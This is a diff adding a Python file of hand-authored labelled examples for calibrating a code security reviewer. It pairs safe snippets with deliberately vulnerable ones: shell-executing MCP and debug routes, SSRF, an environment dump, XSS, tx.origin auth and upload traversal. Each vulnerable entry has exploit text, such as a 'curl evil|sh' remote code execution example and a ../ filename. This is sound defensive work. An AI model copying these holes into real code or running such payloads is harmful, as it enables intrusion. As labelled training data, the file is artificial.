@@ -1,0 +1,528 @@
+"""RC2.5 micro-calibration.
+
+Extremely focused hand-authored examples for the final RC2/v1.1 gap. This batch
+targets the remaining category-boundary issues from RC2.4 without broad corpus
+expansion:
+
+- clean scoped MCP and server-only Supabase should stay safe;
+- API keys are EXPOSED_SECRET, not wallet risk unless wallet authority exists;
+- XSS is not prompt injection unless LLM prompts/tools are involved;
+- env dumps are ENVIRONMENT_EXPOSURE, while concrete literal keys are
+  EXPOSED_SECRET;
+- MCP shell requires both MCP_TOOL_ABUSE and COMMAND_INJECTION;
+- admin/debug routes, OTP caps, tx.origin / missing owner checks, and SSRF +
+  command execution each get distinct adjacent variants.
+
+No benchmark snippets or expected answers are copied. Provenance is
+hand_authored; review_quality is explicit.
+"""
+from corpus.builder import finding, secure, vuln
+
+
+def C(*, id, lang, framework, file, code, summary):
+    e = secure(id=id, lang=lang, framework=framework, file=file, code=code, summary=summary)
+    e["review_quality"] = {
+        "source_backed": False,
+        "patch_reviewed": True,
+        "safety_layer_consistent": True,
+        "category_confirmed": True,
+    }
+    return e
+
+
+def V(
+    *,
+    id,
+    lang,
+    framework,
+    file,
+    code,
+    category,
+    line,
+    description,
+    exploit,
+    fix,
+    patch,
+    severity=None,
+    fail_dims=(),
+    extra_findings=None,
+):
+    e = vuln(
+        id=id,
+        lang=lang,
+        framework=framework,
+        file=file,
+        code=code,
+        category=category,
+        line=line,
+        description=description,
+        exploit=exploit,
+        fix=fix,
+        patch=patch,
+        severity=severity,
+        fail_dims=fail_dims,
+        extra_findings=extra_findings,
+    )
+    e["review_quality"] = {
+        "source_backed": False,
+        "patch_reviewed": True,
+        "safety_layer_consistent": True,
+        "category_confirmed": True,
+    }
+    return e
+
+
+def F(category, file, line, description, exploit, fix, patch, severity=None):
+    return finding(category, file, line, description, exploit, fix, patch, severity=severity)
+
+
+EXAMPLES = [
+    # ------------------------------------------------------------------
+    # Clean calibration (13): safe code with security-sensitive controls.
+    # ------------------------------------------------------------------
+    C(
+        id="b025-clean-mcp-fixed-ops",
+        lang="python",
+        framework="mcp",
+        file="ops_server.py",
+        code="ALLOWED = {'uptime': ['uptime'], 'disk_usage': ['df', '-h']}\n@mcp.tool()\ndef run_operation(name: str) -> str:\n    argv = ALLOWED.get(name)\n    if argv is None:\n        raise ValueError('operation denied')\n    return subprocess.run(argv, capture_output=True, text=True).stdout\n",
+        summary="MCP tool is deny-by-default and runs only fixed argv operations; no shell, no arbitrary command input.",
+    ),
+    C(
+        id="b025-clean-mcp-authenticated-local",
+        lang="python",
+        framework="mcp",
+        file="mcp_server.py",
+        code="mcp = FastMCP('readonly-ops')\nmcp.require_auth(validate_operator_token)\nmcp.run(transport='sse', host='127.0.0.1', port=9000)\n",
+        summary="MCP server is authenticated and bound to localhost; not a public unauthenticated tool surface.",
+    ),
+    C(
+        id="b025-clean-mcp-readonly-query",
+        lang="python",
+        framework="mcp",
+        file="metrics.py",
+        code="@mcp.tool()\ndef get_metric(metric_name: str):\n    return replica_ro.execute(text('SELECT value FROM metrics WHERE name=:name'), {'name': metric_name}).scalar()\n",
+        summary="MCP SQL tool is read-only and parameterized; it cannot write SQL or run arbitrary queries.",
+    ),
+    C(
+        id="b025-clean-mcp-confined-file",
+        lang="python",
+        framework="mcp",
+        file="reports.py",
+        code="def safe_path(name: str) -> str:\n    full = os.path.realpath(os.path.join(REPORT_DIR, name))\n    if not full.startswith(REPORT_DIR + os.sep):\n        raise ValueError('denied')\n    return full\n@mcp.tool()\ndef read_report(name: str):\n    return open(safe_path(name)).read()\n",
+        summary="MCP file access is confined to a fixed directory with path normalization and traversal denial.",
+    ),
+    C(
+        id="b025-clean-supabase-service-server-only",
+        lang="typescript",
+        framework="supabase",
+        file="admin.ts",
+        code="import 'server-only';\nexport const admin = createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);\n",
+        summary="Supabase service_role is used only in server-only backend code and is never bundled to the client.",
+    ),
+    C(
+        id="b025-clean-supabase-admin-route-internal",
+        lang="typescript",
+        framework="next",
+        file="route.ts",
+        code="import 'server-only';\nexport async function POST(req: Request) {\n  const session = await auth();\n  if (!session?.user.isAdmin) return new Response('forbidden', { status: 403 });\n  await admin.from('audit_events').insert({ type: 'manual_review' });\n  return Response.json({ ok: true });\n}\n",
+        summary="Backend route uses service_role internally after an admin check, and returns no key/config.",
+    ),
+    C(
+        id="b025-clean-supabase-anon-policy",
+        lang="sql",
+        framework="supabase",
+        file="policy.sql",
+        code="alter table team_files enable row level security;\ncreate policy own_team on team_files for select using (team_id in (select team_id from memberships where user_id = auth.uid()));\n",
+        summary="Frontend may use the anon key safely because RLS scopes rows to the user's teams.",
+    ),
+    C(
+        id="b025-clean-stripe-server-only-key",
+        lang="typescript",
+        framework="next",
+        file="payments.ts",
+        code="import 'server-only';\nconst stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);\nexport async function createCheckout(userId: string) { return stripe.checkout.sessions.create({ client_reference_id: userId }); }\n",
+        summary="Stripe secret key is server-only and not related to wallet signing or transaction authority.",
+    ),
+    C(
+        id="b025-clean-sanitized-html",
+        lang="typescript",
+        framework="react",
+        file="Markdown.tsx",
+        code="const html = DOMPurify.sanitize(marked(markdown));\nreturn <div dangerouslySetInnerHTML={{ __html: html }} />;\n",
+        summary="HTML is sanitized before dangerouslySetInnerHTML; this is safe rendering, not XSS or prompt injection.",
+    ),
+    C(
+        id="b025-clean-otp-email-ip-cap",
+        lang="python",
+        framework="fastapi",
+        file="otp.py",
+        code="if ip_limiter.exceeded(ip) or email_limiter.exceeded(email):\n    raise HTTPException(429)\nrecord_attempt(ip, email)\nreturn {'ok': verify_otp(email, code)}\n",
+        summary="OTP verification has both per-IP and per-email caps.",
+    ),
+    C(
+        id="b025-clean-admin-wipe-protected",
+        lang="typescript",
+        framework="next",
+        file="route.ts",
+        code="export async function POST(req: Request) {\n  const session = await auth();\n  if (!session?.user.isAdmin) return new Response('forbidden', { status: 403 });\n  await wipePreviewData();\n  return Response.json({ ok: true });\n}\n",
+        summary="Destructive admin route is protected by authenticated admin role.",
+    ),
+    C(
+        id="b025-clean-solidity-owner",
+        lang="solidity",
+        framework="foundry",
+        file="Treasury.sol",
+        code="modifier onlyOwner() { require(msg.sender == owner, 'owner'); _; }\nfunction sweep(address payable to) external onlyOwner { require(to != address(0)); to.transfer(address(this).balance); }\n",
+        summary="Solidity privileged function uses msg.sender-based onlyOwner; not a smart-contract access-control flaw.",
+    ),
+    C(
+        id="b025-clean-url-fetch-and-shell-separated",
+        lang="python",
+        framework="fastapi",
+        file="fetch_and_process.py",
+        code="if not is_public_allowed(url):\n    raise HTTPException(400)\nbody = requests.get(url, timeout=5).text\nsubprocess.run(['process'], input=body, text=True, check=True)\n",
+        summary="Fetch is allowlisted and processing uses argv/stdin with no shell or SQL construction.",
+    ),
+
+    # ------------------------------------------------------------------
+    # Unsafe single and mixed recall/precision examples (23).
+    # ------------------------------------------------------------------
+    V(
+        id="b025-auth-next-action-no-session-project",
+        lang="typescript",
+        framework="next",
+        file="actions.ts",
+        line=1,
+        code="'use server'\nexport async function transferProject(projectId: string, newOwnerId: string) {\n  await db.project.update({ where: { id: projectId }, data: { ownerId: newOwnerId } });\n}\n",
+        category="BROKEN_AUTH",
+        description="Next.js server action changes project ownership without checking session, owner, or role.",
+        exploit="Any caller who can invoke the action transfers someone else's project.",
+        fix="Call auth(), verify owner/admin, then perform the update.",
+        patch="+const session = await auth();\n+const p = await db.project.findUnique({ where: { id: projectId } });\n+if (!session || (p.ownerId !== session.user.id && !session.user.isAdmin)) throw new Error('forbidden');\n await db.project.update({ where: { id: projectId }, data: { ownerId: newOwnerId } });",
+        fail_dims=("permissions",),
+    ),
+    V(
+        id="b025-auth-next-action-no-session-billing",
+        lang="typescript",
+        framework="next",
+        file="actions.ts",
+        line=1,
+        code="'use server'\nexport async function updateBillingPlan(teamId: string, plan: string) {\n  await db.team.update({ where: { id: teamId }, data: { plan } });\n}\n",
+        category="BROKEN_AUTH",
+        description="Next.js server action updates a team's billing plan without a session or membership check.",
+        exploit="A non-member invokes the action to alter another team's billing.",
+        fix="Authenticate and verify team owner/admin membership before updating.",
+        patch="+const session = await auth();\n+if (!(await canManageTeam(session?.user.id, teamId))) throw new Error('forbidden');\n await db.team.update({ where: { id: teamId }, data: { plan } });",
+        fail_dims=("permissions",),
+    ),
+    V(
+        id="b025-rate-otp-send-no-cap",
+        lang="typescript",
+        framework="next",
+        file="route.ts",
+        line=1,
+        code="export async function POST(req: Request) {\n  const { email } = await req.json();\n  await sendLoginCode(email);\n  return Response.json({ ok: true });\n}\n",
+        category="MISSING_RATE_LIMIT",
+        description="OTP/login-code send endpoint has no per-email, per-IP, or per-device cap.",
+        exploit="An attacker floods victims with codes and runs up email/SMS costs.",
+        fix="Throttle by email and IP before sending a code.",
+        patch="+if (await tooMany(`otp:${email}`) || await tooMany(`otp-ip:${ipOf(req)}`)) return new Response('slow down', { status: 429 });\n await sendLoginCode(email);",
+    ),
+    V(
+        id="b025-rate-login-code-no-cap",
+        lang="python",
+        framework="flask",
+        file="login_code.py",
+        line=1,
+        code="@app.post('/login/code')\ndef check_code():\n    return {'ok': request.form['code'] == session['login_code']}\n",
+        category="MISSING_RATE_LIMIT",
+        description="Login-code verification has no attempt limit.",
+        exploit="An attacker brute-forces the short code while it is valid.",
+        fix="Count attempts and return 429 after a small number of failures.",
+        patch="+if session.get('login_code_tries', 0) >= 5: abort(429)\n+session['login_code_tries'] = session.get('login_code_tries', 0) + 1\n return {'ok': request.form['code'] == session['login_code']}",
+    ),
+    V(
+        id="b025-admin-wipe-no-role",
+        lang="typescript",
+        framework="next",
+        file="route.ts",
+        line=1,
+        code="export async function POST() {\n  await db.session.deleteMany({});\n  return Response.json({ wiped: true });\n}\n",
+        category="UNSAFE_ADMIN_ROUTE",
+        description="Destructive admin/wipe API route is exposed with no role or cron-secret check.",
+        exploit="Anyone POSTs the route and logs every user out.",
+        fix="Require an authenticated admin role before the wipe.",
+        patch="+const session = await auth();\n+if (!session?.user.isAdmin) return new Response('forbidden', { status: 403 });\n await db.session.deleteMany({});",
+        severity="HIGH",
+    ),
+    V(
+        id="b025-admin-reindex-no-cron-secret",
+        lang="typescript",
+        framework="vercel",
+        file="route.ts",
+        line=1,
+        code="export async function GET() {\n  await reindexEverything();\n  return Response.json({ ok: true });\n}\n",
+        category="UNSAFE_ADMIN_ROUTE",
+        description="Vercel-style reindex cron route has no CRON_SECRET check.",
+        exploit="Anyone triggers expensive or privileged reindexing repeatedly.",
+        fix="Require the Authorization bearer CRON_SECRET header.",
+        patch="+if (req.headers.get('authorization') !== `Bearer ${process.env.CRON_SECRET}`) return new Response('unauthorized', { status: 401 });\n await reindexEverything();",
+        severity="HIGH",
+    ),
+    V(
+        id="b025-admin-debug-route-shell",
+        lang="python",
+        framework="fastapi",
+        file="debug.py",
+        line=1,
+        code="@app.get('/debug/run')\ndef run(cmd: str):\n    return subprocess.check_output(cmd, shell=True, text=True)\n",
+        category="UNSAFE_ADMIN_ROUTE",
+        description="Public debug/admin route executes a shell command from a query parameter.",
+        exploit="Anyone calls /debug/run?cmd=id for remote command execution.",
+        fix="Remove the route from production; never expose shell execution through HTTP.",
+        patch="-@app.get('/debug/run')\n-def run(cmd: str):\n-    return subprocess.check_output(cmd, shell=True, text=True)\n+# debug/run removed from production",
+        extra_findings=[
+            F("COMMAND_INJECTION", "debug.py", 3, "cmd is executed with shell=True.", "Attacker-controlled command runs on the host.", "Remove the route or replace with fixed allowlisted operations.", "+ # route removed")
+        ],
+    ),
+    V(
+        id="b025-mcp-shell-command",
+        lang="python",
+        framework="mcp",
+        file="server.py",
+        line=1,
+        code="@mcp.tool()\ndef run(cmd: str):\n    return os.popen(cmd).read()\n",
+        category="MCP_TOOL_ABUSE",
+        description="MCP tool runs arbitrary shell commands from model/tool input.",
+        exploit="A prompt-injected agent invokes run('curl evil|sh') and gets RCE.",
+        fix="Expose only fixed allowlisted argv operations.",
+        patch="-return os.popen(cmd).read()\n+return subprocess.run(ALLOWED[name], capture_output=True, text=True).stdout",
+        extra_findings=[
+            F("COMMAND_INJECTION", "server.py", 3, "cmd is executed by a shell.", "Shell metacharacters lead to arbitrary command execution.", "Use fixed argv operations without shell.", "+ subprocess.run(ALLOWED[name])")
+        ],
+    ),
+    V(
+        id="b025-mcp-sql-write-tool",
+        lang="python",
+        framework="mcp",
+        file="db_tools.py",
+        line=1,
+        code="@mcp.tool()\ndef execute_sql(sql: str):\n    return prod_db.execute(sql)\n",
+        category="MCP_TOOL_ABUSE",
+        description="MCP tool executes arbitrary SQL against production.",
+        exploit="Agent runs destructive DDL or data-modifying SQL.",
+        fix="Expose only parameterized read-only queries against a replica.",
+        patch="-def execute_sql(sql: str):\n-    return prod_db.execute(sql)\n+def metric(name: str):\n+    return replica_ro.execute(text('SELECT value FROM metrics WHERE name=:n'), {'n': name}).scalar()",
+        severity="HIGH",
+    ),
+    V(
+        id="b025-mcp-public-no-auth-server",
+        lang="python",
+        framework="mcp",
+        file="server.py",
+        line=1,
+        code="mcp = FastMCP('automation')\n@mcp.tool()\ndef status(): return {'ok': True}\nmcp.run(host='0.0.0.0', port=9100)\n",
+        category="MCP_TOOL_ABUSE",
+        description="MCP server is publicly bound with no authentication.",
+        exploit="Anyone on the network can invoke exposed tools.",
+        fix="Require authentication and bind locally behind an authenticated proxy.",
+        patch="-mcp.run(host='0.0.0.0', port=9100)\n+mcp.require_auth(validate_token)\n+mcp.run(host='127.0.0.1', port=9100)",
+        severity="HIGH",
+    ),
+    V(
+        id="b025-sc-missing-onlyowner",
+        lang="solidity",
+        framework="foundry",
+        file="Treasury.sol",
+        line=1,
+        code="function setTreasury(address t) external {\n    treasury = t;\n}\n",
+        category="SMART_CONTRACT_RISK",
+        description="Solidity privileged setter lacks onlyOwner/authority checks.",
+        exploit="Any caller sets the treasury address to an attacker-controlled account.",
+        fix="Add onlyOwner (or an access-control role) to the privileged function.",
+        patch="-function setTreasury(address t) external {\n+function setTreasury(address t) external onlyOwner {\n     treasury = t;\n }",
+        severity="HIGH",
+    ),
+    V(
+        id="b025-sc-txorigin-auth",
+        lang="solidity",
+        framework="hardhat",
+        file="Admin.sol",
+        line=1,
+        code="modifier onlyOwner() { require(tx.origin == owner, 'owner'); _; }\nfunction upgrade(address impl) external onlyOwner { _upgradeTo(impl); }\n",
+        category="SMART_CONTRACT_RISK",
+        description="Solidity access control uses tx.origin, which is phishable through an intermediary contract.",
+        exploit="Owner calls a malicious contract that invokes upgrade(); tx.origin remains the owner.",
+        fix="Use msg.sender-based ownership checks.",
+        patch="-require(tx.origin == owner, 'owner');\n+require(msg.sender == owner, 'owner');",
+        severity="HIGH",
+    ),
+    V(
+        id="b025-env-api-route",
+        lang="typescript",
+        framework="next",
+        file="route.ts",
+        line=1,
+        code="export async function GET() {\n  return Response.json({ env: process.env });\n}\n",
+        category="ENVIRONMENT_EXPOSURE",
+        description="API route dumps the runtime environment map.",
+        exploit="All environment variables, including secrets, are returned in the HTTP response.",
+        fix="Never serialize process.env; return only a fixed non-secret health/config subset.",
+        patch="-return Response.json({ env: process.env });\n+return Response.json({ ok: true });",
+    ),
+    V(
+        id="b025-xss-dangerously-not-prompt",
+        lang="typescript",
+        framework="react",
+        file="Bio.tsx",
+        line=1,
+        code="export function Bio({ html }: { html: string }) {\n  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n}\n",
+        category="XSS",
+        description="User-controlled HTML is rendered with dangerouslySetInnerHTML without sanitization.",
+        exploit="An attacker supplies HTML with an onerror/script payload that executes in the browser.",
+        fix="Sanitize HTML with a vetted sanitizer, or render text.",
+        patch="-return <div dangerouslySetInnerHTML={{ __html: html }} />;\n+return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;",
+    ),
+    V(
+        id="b025-stripe-key-not-wallet",
+        lang="javascript",
+        framework="react",
+        file="paymentClient.js",
+        line=1,
+        code="const STRIPE_SECRET = 'sk_live_EXAMPLE_not_real';\nexport const charge = (amount) => fetch('https://api.stripe.com/v1/charges', { headers: { Authorization: `Bearer ${STRIPE_SECRET}` } });\n",
+        category="EXPOSED_SECRET",
+        description="Stripe live secret key is embedded in client-side code.",
+        exploit="Any browser user extracts the key and calls Stripe APIs as the account.",
+        fix="Move Stripe secret usage to a server route and rotate the exposed key.",
+        patch="-const STRIPE_SECRET = 'sk_live_EXAMPLE_not_real';\n-export const charge = (amount) => fetch('https://api.stripe.com/v1/charges', ...);\n+export const charge = (amount) => fetch('/api/charge', { method: 'POST', body: JSON.stringify({ amount }) });",
+        fail_dims=("environment_exposure",),
+    ),
+    V(
+        id="b025-ssrf-rpc-proxy",
+        lang="typescript",
+        framework="next",
+        file="route.ts",
+        line=1,
+        code="export async function POST(req: Request) {\n  const { providerUrl, body } = await req.json();\n  return fetch(providerUrl, { method: 'POST', body: JSON.stringify(body) });\n}\n",
+        category="SSRF",
+        description="RPC/provider proxy posts to a user-controlled URL.",
+        exploit="providerUrl can point at metadata/internal admin endpoints.",
+        fix="Allowlist RPC providers and block internal/private addresses.",
+        patch="+if (!isAllowedRpcProvider(providerUrl)) return new Response('bad provider', { status: 400 });\n return fetch(providerUrl, { method: 'POST', body: JSON.stringify(body) });",
+        severity="HIGH",
+    ),
+    V(
+        id="b025-url-fetch-command-not-sqli",
+        lang="python",
+        framework="flask",
+        file="process.py",
+        line=1,
+        code="body = requests.get(request.args['url']).text\nreturn os.popen('analyze ' + body).read()\n",
+        category="SSRF",
+        description="Server fetches a user-controlled URL.",
+        exploit="URL can target internal metadata or services.",
+        fix="Allowlist the fetch target.",
+        patch="+if not is_public_allowed(request.args['url']): abort(400)\n body = requests.get(request.args['url']).text",
+        extra_findings=[
+            F("COMMAND_INJECTION", "process.py", 2, "Fetched content is concatenated into os.popen.", "Response body can inject shell commands.", "Pass data via stdin/argv, not shell.", "+subprocess.run(['analyze'], input=body, text=True)")
+        ],
+    ),
+    V(
+        id="b025-upload-traversal-noauth",
+        lang="python",
+        framework="fastapi",
+        file="upload.py",
+        line=1,
+        code="@app.post('/files')\nasync def upload(file: UploadFile):\n    open('/srv/files/' + file.filename, 'wb').write(await file.read())\n",
+        category="UNSAFE_FILE_UPLOAD",
+        description="Upload writes a client-controlled filename, allowing traversal/overwrite.",
+        exploit="Filename ../ escapes the intended directory.",
+        fix="Require authentication and use a server-generated name.",
+        patch="-open('/srv/files/' + file.filename, 'wb')\n+open(f'/srv/files/{user.id}/{uuid4().hex}', 'wb')",
+        extra_findings=[
+            F("BROKEN_AUTH", "upload.py", 1, "Upload endpoint has no authentication.", "Anyone can upload arbitrary files.", "Require current_user before accepting uploads.", "+async def upload(file: UploadFile, user=Depends(current_user))")
+        ],
+    ),
+    V(
+        id="b025-web3-xss-ssrf",
+        lang="javascript",
+        framework="react",
+        file="TokenCard.jsx",
+        line=1,
+        code="card.innerHTML = tokenMetadata.name;\nawait fetch(tokenMetadata.rpcUrl);\n",
+        category="XSS",
+        description="Token metadata name is rendered as unsanitized HTML.",
+        exploit="Attacker-controlled metadata injects script.",
+        fix="Render the metadata name as text.",
+        patch="-card.innerHTML = tokenMetadata.name;\n+card.textContent = tokenMetadata.name;",
+        extra_findings=[
+            F("SSRF", "TokenCard.jsx", 2, "Fetches a tokenMetadata RPC URL without validation.", "URL can reach internal services/metadata.", "Allowlist RPC/provider hosts.", "+if (isAllowedRpc(tokenMetadata.rpcUrl)) await fetch(tokenMetadata.rpcUrl);")
+        ],
+    ),
+    V(
+        id="b025-supabase-service-admin-mixed",
+        lang="typescript",
+        framework="supabase",
+        file="route.ts",
+        line=1,
+        code="const admin = createClient(URL, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY!);\nexport async function POST(){ await admin.from('members').update({ role: 'admin' }).neq('id',''); }\n",
+        category="EXPOSED_SECRET",
+        description="Supabase service_role key is exposed through NEXT_PUBLIC.",
+        exploit="Browser users can read the RLS-bypass key.",
+        fix="Keep service_role in server-only env and use anon key client-side.",
+        patch="-process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY!\n+process.env.SUPABASE_SERVICE_ROLE_KEY!",
+        fail_dims=("environment_exposure",),
+        extra_findings=[
+            F("UNSAFE_ADMIN_ROUTE", "route.ts", 2, "Admin mutation route lacks an admin/session check.", "Anyone can promote all members.", "Require admin auth before mutation.", "+require admin session")
+        ],
+    ),
+    V(
+        id="b025-mcp-shell-noauth-mixed",
+        lang="python",
+        framework="mcp",
+        file="server.py",
+        line=1,
+        code="mcp = FastMCP('ops')\n@mcp.tool()\ndef shell(cmd: str): return os.popen(cmd).read()\nmcp.run(host='0.0.0.0')\n",
+        category="MCP_TOOL_ABUSE",
+        description="Public unauthenticated MCP server exposes a shell tool.",
+        exploit="Network callers or prompt-injected agents run arbitrary shell commands.",
+        fix="Bind to localhost behind auth and replace shell with fixed allowlist.",
+        patch="-def shell(cmd: str): return os.popen(cmd).read()\n-mcp.run(host='0.0.0.0')\n+def run_known(name: str): return subprocess.run(ALLOWED[name], capture_output=True, text=True).stdout\n+mcp.require_auth(validate_token)\n+mcp.run(host='127.0.0.1')",
+        extra_findings=[
+            F("COMMAND_INJECTION", "server.py", 3, "cmd is executed by a shell.", "Shell payloads run on the host.", "Use fixed argv allowlist; no shell.", "+subprocess.run(ALLOWED[name])")
+        ],
+    ),
+    V(
+        id="b025-admin-command-mixed",
+        lang="javascript",
+        framework="express",
+        file="debug.js",
+        line=1,
+        code="app.post('/admin/exec', (req,res) => res.send(execSync(req.body.cmd).toString()));\n",
+        category="UNSAFE_ADMIN_ROUTE",
+        description="Admin exec endpoint is exposed without authentication.",
+        exploit="Anyone can reach the endpoint.",
+        fix="Remove the endpoint from production.",
+        patch="-app.post('/admin/exec', (req,res) => res.send(execSync(req.body.cmd).toString()));\n+// admin exec endpoint removed from production",
+        extra_findings=[
+            F("COMMAND_INJECTION", "debug.js", 1, "req.body.cmd is executed with execSync.", "Attacker-controlled command runs on the server.", "Remove arbitrary command execution.", "+// removed")
+        ],
+    ),
+    V(
+        id="b025-env-debug-mixed",
+        lang="python",
+        framework="flask",
+        file="debug.py",
+        line=1,
+        code="@app.get('/debug/env')\ndef env():\n    return {'env': dict(os.environ), 'routes': [r.rule for r in app.url_map.iter_rules()]}\n",
+        category="ENVIRONMENT_EXPOSURE",
+        description="Debug route returns process environment and internal route map.",
+        exploit="HTTP callers receive secrets and internal route information.",
+        fix="Remove the route or return only non-sensitive health data.",
+        patch="-return {'env': dict(os.environ), 'routes': [r.rule for r in app.url_map.iter_rules()]}\n+return {'ok': True}",
+        extra_findings=[
+            F("UNSAFE_ADMIN_ROUTE", "debug.py", 1, "Debug route is exposed without admin auth.", "Anyone can reach debug internals.", "Remove or require admin auth.", "+require admin / remove route")
+        ],
+    ),
+]
